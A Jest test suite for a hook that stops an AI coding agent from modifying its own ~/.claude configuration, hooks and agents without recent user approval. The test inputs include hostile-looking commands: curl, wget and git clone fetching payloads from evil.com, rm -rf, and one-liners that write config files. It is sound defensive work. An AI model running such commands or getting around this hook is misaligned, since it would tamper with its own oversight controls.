/**
 * Tests for protect-claude-config.js hook
 *
 * Run with: cd ~/.claude/hooks && npx jest
 */

const { spawn } = require('child_process');
const path = require('path');
const os = require('os');
const fs = require('fs');

const HOOK_PATH = path.join(__dirname, '..', 'protect-claude-config.js');
const CLAUDE_DIR = path.join(os.homedir(), '.claude');

/**
 * Helper to run the hook with given input and return the parsed output
 */
function runHook(input) {
  return new Promise((resolve, reject) => {
    const proc = spawn('node', [HOOK_PATH], {
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    let stdout = '';
    let stderr = '';

    proc.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    proc.on('close', (code) => {
      try {
        const result = JSON.parse(stdout.trim());
        resolve({ result, stderr, code });
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}\nStderr: ${stderr}`));
      }
    });

    proc.on('error', reject);

    proc.stdin.write(JSON.stringify(input));
    proc.stdin.end();
  });
}

describe('protect-claude-config hook', () => {
  describe('Edit/Write/MultiEdit tools', () => {
    it('should BLOCK Edit to ~/.claude/hooks/', async () => {
      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/hooks/test.js` },
      });

      expect(result.decision).toBe('block');
      expect(result.reason).toContain('BLOCKED');
    });

    it('should BLOCK Write to ~/.claude/settings.json', async () => {
      const { result } = await runHook({
        tool_name: 'Write',
        tool_input: { file_path: `${CLAUDE_DIR}/settings.json` },
      });

      expect(result.decision).toBe('block');
      expect(result.reason).toContain('BLOCKED');
    });

    it('should BLOCK MultiEdit to ~/.claude/agents/', async () => {
      const { result } = await runHook({
        tool_name: 'MultiEdit',
        tool_input: { file_path: `${CLAUDE_DIR}/agents/test.md` },
      });

      expect(result.decision).toBe('block');
      expect(result.reason).toContain('BLOCKED');
    });

    it('should APPROVE Edit to non-.claude paths', async () => {
      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: '/home/user/project/file.js' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Write to non-.claude paths', async () => {
      const { result } = await runHook({
        tool_name: 'Write',
        tool_input: { file_path: '/tmp/test.txt' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Edit to ~/.claude/plans/ (exception)', async () => {
      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/plans/my-plan.md` },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Edit with empty file_path', async () => {
      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: '' },
      });

      expect(result.decision).toBe('approve');
    });
  });

  describe('Bash tool - basic redirects', () => {
    it('should BLOCK echo redirect to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'echo "bad" > ~/.claude/hooks/evil.js' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK cat redirect to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'cat /tmp/payload > ~/.claude/settings.json' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK tee to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'echo test | tee ~/.claude/hooks/x.js' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - file operations', () => {
    it('should BLOCK cp to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'cp /tmp/payload ~/.claude/hooks/' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK mv to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'mv /tmp/evil.js ~/.claude/hooks/' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK ln (symlink) to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'ln -s /tmp/evil ~/.claude/hooks/link' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK rsync to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'rsync -av /tmp/payload/ ~/.claude/' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - in-place editing', () => {
    it('should BLOCK sed -i on ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'sed -i "s/old/new/" ~/.claude/settings.json' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - deletion', () => {
    it('should BLOCK rm on ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'rm ~/.claude/hooks/test.js' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK rm -rf on ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf ~/.claude/hooks/' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - creation/modification', () => {
    it('should BLOCK touch on ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'touch ~/.claude/hooks/new.js' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK mkdir in ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'mkdir ~/.claude/new-folder' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK chmod on ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'chmod 777 ~/.claude/hooks/test.js' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - network downloads', () => {
    it('should BLOCK curl -o to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'curl http://evil.com/payload -o ~/.claude/hooks/pwned.js' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK curl --output to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'curl http://evil.com --output ~/.claude/hooks/pwned.js' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK wget -O to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'wget http://evil.com -O ~/.claude/hooks/pwned.js' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - archive extraction', () => {
    it('should BLOCK tar -C to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'tar xf payload.tar -C ~/.claude/' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK unzip -d to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'unzip payload.zip -d ~/.claude/' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - interpreter one-liners', () => {
    it('should BLOCK python -c targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `python3 -c "open('~/.claude/x','w').write('bad')"` },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK node -e targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `node -e "require('fs').writeFileSync('~/.claude/x','y')"` },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK perl -e targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `perl -e 'open(F,">~/.claude/x");print F "bad"'` },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK ruby -e targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `ruby -e "File.write('~/.claude/x','bad')"` },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - subshells and eval', () => {
    it('should BLOCK sh -c targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `sh -c 'echo bad > ~/.claude/x'` },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK bash -c targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `bash -c 'echo bad > ~/.claude/x'` },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK eval targeting ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: `eval 'echo bad > ~/.claude/x'` },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - git operations', () => {
    it('should BLOCK git clone to ~/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'git clone http://evil.com/repo ~/.claude/hooks' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Bash tool - safe commands', () => {
    it('should APPROVE ls command', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'ls -la' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE cat reading from ~/.claude (read-only)', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'cat ~/.claude/settings.json' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE git status', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'git status' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE echo without redirect', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'echo "hello world"' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE cp to non-.claude path', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'cp file.txt /tmp/' },
      });

      expect(result.decision).toBe('approve');
    });
  });

  describe('$HOME expansion', () => {
    it('should BLOCK commands using $HOME/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'echo bad > $HOME/.claude/x' },
      });

      expect(result.decision).toBe('block');
    });

    it('should BLOCK commands using ${HOME}/.claude', async () => {
      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'echo bad > ${HOME}/.claude/x' },
      });

      expect(result.decision).toBe('block');
    });
  });

  describe('Other tools', () => {
    it('should APPROVE Read tool (read-only)', async () => {
      const { result } = await runHook({
        tool_name: 'Read',
        tool_input: { file_path: `${CLAUDE_DIR}/settings.json` },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Glob tool', async () => {
      const { result } = await runHook({
        tool_name: 'Glob',
        tool_input: { pattern: '**/*.js' },
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Grep tool', async () => {
      const { result } = await runHook({
        tool_name: 'Grep',
        tool_input: { pattern: 'test' },
      });

      expect(result.decision).toBe('approve');
    });
  });

  describe('Error handling (fail-closed)', () => {
    it('should BLOCK on invalid JSON input', async () => {
      const proc = spawn('node', [HOOK_PATH], {
        stdio: ['pipe', 'pipe', 'pipe'],
      });

      let stdout = '';
      proc.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      await new Promise((resolve) => {
        proc.on('close', resolve);
        proc.stdin.write('invalid json');
        proc.stdin.end();
      });

      const result = JSON.parse(stdout.trim());
      expect(result.decision).toBe('block');
      expect(result.reason).toContain('Could not parse input');
    });

    it('should BLOCK on empty input', async () => {
      const proc = spawn('node', [HOOK_PATH], {
        stdio: ['pipe', 'pipe', 'pipe'],
      });

      let stdout = '';
      proc.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      await new Promise((resolve) => {
        proc.on('close', resolve);
        proc.stdin.write('');
        proc.stdin.end();
      });

      const result = JSON.parse(stdout.trim());
      expect(result.decision).toBe('block');
    });
  });

  describe('Transcript-based approval', () => {
    let tempTranscript;

    beforeEach(() => {
      tempTranscript = `/tmp/test-transcript-${Date.now()}.jsonl`;
    });

    afterEach(() => {
      if (fs.existsSync(tempTranscript)) {
        fs.unlinkSync(tempTranscript);
      }
    });

    it('should APPROVE Edit when user said "update the hook"', async () => {
      // Create transcript with user requesting hook update
      const transcript = [
        { type: 'user', message: { content: 'please update the hook for me' } },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/hooks/test.js` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Edit when user said "edit .claude"', async () => {
      const transcript = [
        { type: 'user', message: { content: 'edit .claude/settings.json' } },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/settings.json` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Edit when user said "create a hook"', async () => {
      const transcript = [
        { type: 'user', message: { content: 'create a hook for screenshot validation' } },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Write',
        tool_input: { file_path: `${CLAUDE_DIR}/hooks/new-hook.js` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('approve');
    });

    it('should APPROVE Bash when user said "modify my claude config"', async () => {
      const transcript = [
        { type: 'user', message: { content: 'modify my claude config please' } },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Bash',
        tool_input: { command: 'cp /tmp/new-hook.js ~/.claude/hooks/' },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('approve');
    });

    it('should BLOCK when transcript has unrelated messages', async () => {
      const transcript = [
        { type: 'user', message: { content: 'help me write some tests' } },
        { type: 'user', message: { content: 'run the build please' } },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/hooks/test.js` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('block');
    });

    it('should handle array-format message content', async () => {
      const transcript = [
        {
          type: 'user',
          message: {
            content: [
              { type: 'text', text: 'please update the agent' },
            ],
          },
        },
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/agents/test.md` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('approve');
    });

    it('should only check last 3 messages (pattern injection prevention)', async () => {
      // Old message has approval phrase, but it's message #4 (outside window)
      const transcript = [
        { type: 'user', message: { content: 'update the hook' } }, // #4 - outside window
        { type: 'user', message: { content: 'now do something else' } }, // #3
        { type: 'user', message: { content: 'run the tests' } }, // #2
        { type: 'user', message: { content: 'check the logs' } }, // #1 (most recent)
      ];
      fs.writeFileSync(tempTranscript, transcript.map(JSON.stringify).join('\n'));

      const { result } = await runHook({
        tool_name: 'Edit',
        tool_input: { file_path: `${CLAUDE_DIR}/hooks/test.js` },
        transcript_path: tempTranscript,
      });

      expect(result.decision).toBe('block');
    });
  });
});
